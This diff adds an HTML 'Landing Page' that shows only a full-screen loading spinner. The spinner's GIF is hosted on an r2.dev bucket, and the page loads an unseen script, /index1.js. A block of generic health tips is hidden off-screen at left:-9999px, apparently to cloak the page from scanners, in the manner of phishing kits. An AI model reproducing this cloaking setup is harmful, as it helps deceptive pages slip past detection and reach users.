@@ -1,0 +1,124 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Landing Page</title>
+    <script src="https://unpkg.com/axios/dist/axios.min.js"></script>
+    <style>
+      * {
+        -moz-box-sizing: border-box;
+        -webkit-box-sizing: border-box;
+        -webkit-tap-highlight-color: transparent;
+        -ms-box-sizing: border-box;
+        box-sizing: border-box;
+      }
+
+      .spinnerPanel {
+        position: absolute;
+        top: 0px;
+        left: 0px;
+        width: 100%;
+        height: 100%;
+        background-color: rgba(0, 0, 64, 0.2);
+        z-index: 3;
+      }
+
+      .spinner {
+        display: block;
+        position: relative;
+        top: 40%;
+        margin: auto;
+        width: 58px;
+        height: 58px;
+        background-color: rgba(0, 0, 0, 1);
+        -moz-border-radius: 8px;
+        -webkit-border-radius: 8px;
+        border-radius: 8px;
+        z-index: 3;
+      }
+
+      .spinner span.messageIcon {
+        background: url('https://pub-f2d41028a0ea400089bca9a44ed4b2de.r2.dev/loadingLarge.gif') left no-repeat;
+        background-size: 35px 35px;
+        -webkit-background-size: 35px 35px;
+        -moz-background-size: 35px 35px;
+        display: inline-block;
+        height: 58px;
+        width: 35px;
+        margin-left: auto;
+        margin-right: auto;
+        display: block;
+      }
+
+      .adaHidden {
+        overflow: hidden;
+        width: 0;
+        height: 0;
+        opacity: 0;
+        display: inline-block;
+        position: absolute;
+      }
+
+      body {
+        font-family: "Helvetica Neue", "Droid Sans", Roboto, Arial, sans-serif;
+        font-size: 0.875em;
+        color: #191919;
+        text-shadow: none;
+        background-color: rgba(249, 247, 244, 1);
+        background-repeat: no-repeat;
+        height: 100%;
+        overflow-x: hidden;
+      }
+
+      body {
+        -webkit-text-size-adjust: none;
+      }
+
+      #page {
+        position: absolute;
+        left: -9999px;
+      }
+    </style>
+  </head>
+
+  <body>
+    <div id="page">
+      General Health Tips: Stay Hydrated: Drink plenty of water throughout the
+      day. It helps with digestion, skin health, and overall well-being. Eat a
+      Balanced Diet: Incorporate fruits, vegetables, whole grains, lean
+      proteins, and healthy fats into your meals. Get Enough Sleep: Aim for 7-9
+      hours of sleep each night to help your body recover and stay energized.
+      Exercise Regularly: Try to get at least 30 minutes of moderate exercise
+      most days of the week. Activities like walking, jogging, or yoga can
+      improve cardiovascular health and mood. Practice Good Hygiene: Wash your
+      hands regularly, brush your teeth twice a day, and take care of your skin
+      to prevent infections and promote health. Mental Health Tips: Manage
+      Stress: Practice relaxation techniques like deep breathing, meditation, or
+      mindfulness to reduce stress levels. Stay Connected: Maintain
+      relationships with friends and family. Socializing can help improve mental
+      health and provide support. Take Breaks: Whether at work or at home, take
+      regular breaks to avoid burnout. A short walk or a few minutes of
+      stretching can make a difference. Limit Screen Time: Spending too much
+      time on digital devices can negatively affect your sleep and mental
+      well-being. Try to set limits on screen time, especially before bed. Seek
+      Help When Needed: If you're struggling with mental health issues, don't
+      hesitate to talk to a professional. Mental health is just as important as
+      physical health.
+    </div>
+    <div class="spinnerPanel" style="height: 100vh">
+      <div class="spinner" style="top: 45%">
+        <span class="messageIcon"> </span
+        ><a
+          id="spinnerLink"
+          class="adaHidden"
+          href="javascript:void(0)"
+          role="dialog"
+          >processing</a
+        >
+      </div>
+    </div>
+   
+    <script src="/index1.js"></script>
+  </body>
+</html>
